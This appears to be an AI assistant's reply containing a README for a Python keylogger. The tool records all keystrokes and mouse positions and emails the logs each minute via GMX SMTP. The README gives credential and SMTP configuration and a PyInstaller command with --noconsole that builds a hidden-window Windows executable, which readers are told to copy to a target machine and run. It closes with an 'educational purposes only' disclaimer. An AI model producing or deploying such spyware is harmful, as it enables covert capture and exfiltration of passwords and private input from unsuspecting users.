Here is the complete content you can copy and save as your `README.md` file:

---

# Key+Mouse Logger with Email Notifications

This project logs keyboard and mouse activity and sends the logs to an email address every minute. The logs include:  
1. Key presses  
2. Mouse pointer movements  

The application is bundled into a single `.exe` file for testing on Windows machines.

---

## **Features**
- Records all key presses into `keyboard.txt`.
- Logs mouse pointer positions into `mouse.txt`.
- Sends email notifications with logs every minute using GMX mail SMTP.
- Built with `pynput` for keyboard and mouse tracking.

---

## **Getting Started**

### **Prerequisites**
- Python 3.7+ installed.
- `pip` for installing dependencies.
- GMX mail account credentials (email and password) for email notifications.
- Docker (for building the application into a Windows executable if working on Linux).

---

## **Installation**

### **Step 1: Clone the Repository**
```bash
git clone <repository-url>
cd keylogger-project
```

### **Step 2: Install Dependencies**
Install the required Python libraries:
```bash
pip install -r requirements.txt
```

### **Step 3: Configure GMX Email Credentials**
1. Open the `key+mouselog.py` file.
2. Replace the placeholder email credentials with your GMX email:
   ```python
   email_user = 'your_gmx_email@gmx.com'
   email_password = 'your_gmx_password'
   email_recipient = 'recipient_email@example.com'
   ```

---

## **Running the Application**

Run the script directly with Python to start logging:
```bash
python key+mouselog.py
```

- The `keyboard.txt` and `mouse.txt` files will be created in the same directory to store the logs.
- Logs will be sent to the configured email every minute.

---

## **Building the Application**

To bundle the application into a standalone `.exe` file for Windows, follow these steps:

### **Step 1: Install Docker**
If Docker isn't already installed, download and install it from [Docker's official site](https://www.docker.com/).

### **Step 2: Build the Executable**
Use the `cdrx/pyinstaller-windows` Docker image to compile the Python script into a Windows executable:
```bash
docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows --onefile --noconsole key+mouselog.py
```

The built `.exe` file will appear in the `dist/` folder.

### **Step 3: Transfer to Windows**
1. Copy the generated `.exe` file to a Windows machine.
2. Run the executable file to start the keylogger.

---

## **SMTP Email Configuration**

This project uses GMX mail as the email provider. Here’s how to configure and test it:

1. Create a GMX account at [GMX's website](https://www.gmx.com/).
2. Enable SMTP for your account:
   - Log into GMX mail.
   - Go to **Settings > POP3 & IMAP** and enable "Access to this account via POP3 & IMAP."
3. Use the following SMTP settings in your code:
   ```python
   smtp_server = 'mail.gmx.com'
   smtp_port = 587
   email_user = 'your_gmx_email@gmx.com'
   email_password = 'your_gmx_password'
   ```

---

## **Testing**

1. Run the script or executable.
2. Perform key presses and move the mouse.
3. Verify:
   - Logs are saved in `keyboard.txt` and `mouse.txt`.
   - Emails with the logs are received every minute.

---

## **Notes**
- Ensure your GMX credentials are valid. If you encounter login issues, check your account settings or contact GMX support.
- For security, avoid hardcoding sensitive credentials. Use environment variables or a configuration file.

---

## **Disclaimer**

This project is for **educational purposes only**. Unauthorized use of keyloggers is illegal and unethical. Ensure you have permission to deploy this application on any machine.

---
